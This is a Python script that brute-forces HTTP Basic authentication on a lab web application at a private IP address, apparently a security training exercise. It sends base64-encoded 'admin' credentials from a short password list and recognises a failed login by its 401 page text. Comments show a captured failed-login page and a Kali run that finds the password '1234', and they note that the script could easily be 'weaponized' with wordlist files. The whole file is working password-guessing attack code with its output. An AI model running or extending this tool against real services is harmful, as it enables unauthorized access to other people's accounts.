import base64
import requests
'''

This program is used for brute forcing the password on an httpauth web application.
A few modifications could weaponize this into accepting filenames for usernames, passwords, and urls.
IF YOU FEEL THE NEED TO ASK FOR THE MODIFIED CODE, DONT!
Quit being a script kiddie.

'''

'''
	This function returns the user and password encoded in base64
	The input into the base64 encode call is 'admin:password'
	The return byte string will be similar to: 'Basic YWRtaW46dGVzdA=='
'''
def get_b64_auth(passwd):
	return b'Basic ' + base64.b64encode(b'admin:'+passwd)

def main():

	url=r'http://192.168.1.161/security/3/httpauth/' # the user name for login is already known as admin
	#proxies={'http': 'localhost:8080'} # proxy for debugging
	headers={
	'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0', 
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
	'Accept-Language': 'en-US,en;q=0.5', 
	'Connection': 'close', 
	'Upgrade-Insecure-Requests': '1', 
	'Authorization': 'tmp'}
	
		
	passes=['test','1','2222','abc','bbb','1234']
	eachpass=[get_b64_auth(bytes(i,'latin-1')) for i in passes]
	d=dict(zip(passes,eachpass))

	sesh=requests.session()	

	for k,v in d.items():
		headers['Authorization'] = v
		#resp=sesh.get(url,proxies=proxies,headers=headers) #proxy for debugging
		resp=sesh.get(url,headers=headers)
		'''
			No idea what a valid login reponse will look like.
			The partial string being tested was extracted from an invalid
			login.
		'''
		if b'This server could not verify' not in resp.content: # print response if valid login
			print(resp.content)
			print('Password is: {}'.format(k)) # print password after login password found

if __name__=='__main__':
	main()

'''

BAD LOGIN:
b'<?xml version="1.0" encoding="ISO-8859-1"?>\r\n<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"\r\n  
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">\r\n
<head>\r\n<title>Authentication required!</title>\r\n<link rev="made" href="mailto:postmaster@localhost" />\r\n
<style type="text/css"><!--/*--><![CDATA[/*><!--*/ \r\n    body { color: #000000; background-color: #FFFFFF; }\r\n    
a:link { color: #0000CC; }\r\n    p, address {margin-left: 3em;}\r\n    span {font-size: smaller;}\r\n/*]]>*/--></style>\r\n</head>\r\n\r\n
<body>\r\n<h1>Authentication required!</h1>\r\n
<p>\r\n\r\n\r\n    This server could not verify that you are authorized to access\r\n    
the URL "/security/3/httpauth/".\r\n    You either supplied the wrong credentials (e.g., bad password), or your\r\n    
browser doesn\'t understand how to supply the credentials required.\r\n\r\n  </p>\r\n<p>\r\n\r\n\r\n    
In case you are allowed to request the document, please\r\n    check your user-id and password and try again.\r\n\r\n</p>\r\n<p>\r\n
If you think this is a server error, please contact\r\nthe <a href="mailto:postmaster@localhost">webmaster</a>.\r\n\r\n</p>\r\n\r\n
<h2>Error 401</h2>\r\n<address>\r\n  <a href="/">192.168.1.161</a><br />\r\n  \r\n  <span>09/19/18 17:47:22<br />\r\n  
Apache/2.2.21 (Win32) mod_ssl/2.2.21 OpenSSL/1.0.0e PHP/5.3.8 mod_perl/2.0.4 Perl/v5.10.1</span>\r\n</address>\r\n</body>\r\n</html>\r\n\r\n'

PASSWORD FOUND:
root@kali:~/scripts/PythonScripts# python3 httpauth.py 
b'Logged in :)'
Password is: 1234

'''